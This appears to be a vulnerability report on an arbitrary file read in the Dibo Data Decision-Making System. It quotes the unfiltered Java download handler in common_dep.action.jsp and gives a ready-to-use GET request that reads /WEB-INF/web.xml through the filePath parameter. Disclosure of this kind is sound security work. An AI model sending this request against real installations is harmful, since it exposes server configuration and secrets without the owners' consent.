## Dibo Data Decision-Making System has an arbitrary file read vulnerability.

**Official Website：** https://www.dibcn.com/

The system usage and system fingerprint are as follows.

<img width="2105" height="1219" alt="image" src="https://github.com/user-attachments/assets/f86adda4-5d99-42c0-afd0-8bb0e2518d0f" />

### Vulnerability Analysis

One sink point is found at common/dep/common_dep.action.jsp. This JSP internally accepts two parameters, designated as path and filename.
```
 private Object downloadImpTemplet() throws Exception {
        HttpServletRequest request = ActionContext.getInstance().getRequest();
        HttpServletResponse res = ActionContext.getInstance().getResponse();
        //request.setCharacterEncoding("UTF-8");
        String filePath = request.getParameter("filePath");
        String fileName = request.getParameter("fileName");
        Assert.hasText(filePath, "模板文件路径不能为空");
        Assert.hasText(fileName, "模板文件名不能为空");
        fileName = new String(fileName.getBytes("ISO-8859-1"), "UTF-8");
        // 服务器相对路径
        String path = request.getServletContext().getRealPath(filePath);
        // 检查文件是否存在
        File obj = new File(path);
        if(!obj.exists()){
            res.setContentType("text/html;charset=UTF-8");
            res.getWriter().print("指定文件不存在！");
            return null;
        }
        // 读取文件名：用于设置客户端保存时指定默认文件名
        // 写流文件到前端浏览器
        fileName = URLEncoder.encode(fileName, "UTF-8");
        fileName = fileName.replace("+", "%20");
        ServletOutputStream out = res.getOutputStream();
        res.setContentType("application/x-download");//设置为下载application/x-download
        res.addHeader("Content-Disposition","attachment;filename="+ fileName);
        BufferedInputStream bis = null;
        BufferedOutputStream bos = null;
        try {
            bis = new BufferedInputStream(new FileInputStream(path));
            bos = new BufferedOutputStream(out);
            byte[] buff = new byte[2048];
            int bytesRead;
            while (-1 != (bytesRead = bis.read(buff, 0, buff.length))) {
                bos.write(buff, 0, bytesRead);
            }
        } catch (IOException e) {
            throw e;
        } finally {
            try {
                if (bis != null) {
                    bis.close();
                }
            } catch (Exception ex) {
                logOutput.error("关闭bis资源出错！");
            }
            try {
                if (bos != null) {
                    bos.close();
                }
            } catch (Exception ex) {
                logOutput.error("关闭bos资源出错！");
            }
        }
        return null;
    }
```
<img width="2374" height="1319" alt="image" src="https://github.com/user-attachments/assets/238050a9-38ce-46a4-b653-3f944a74730b" />
The downloadImpTemplet() method reads files via the path and echoes the content. There is no filtering applied to the input path, so an arbitrary file read vulnerability exists.  

To invoke this method, it is necessary to specify the action as `downloadImpTemplet` in the URL.

<img width="1629" height="1245" alt="image" src="https://github.com/user-attachments/assets/116a6180-d400-4e9b-bb55-f19913760bd1" />

Thus, a PoC can be constructed as follows:

```
GET /common/dep/common_dep.action.jsp?action=downloadImpTemplet&filePath=/WEB-INF/web.xml&fileName=12 HTTP/1.1
Host: 
Cookie: JSESSIONID=8EE92ABDDC45DA843C24458BF48CCCAB
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

<img width="1860" height="735" alt="image" src="https://github.com/user-attachments/assets/34de9739-f49c-45dc-8864-4e24eb854aa0" />

Thank you for your review, and wish you happiness every day.

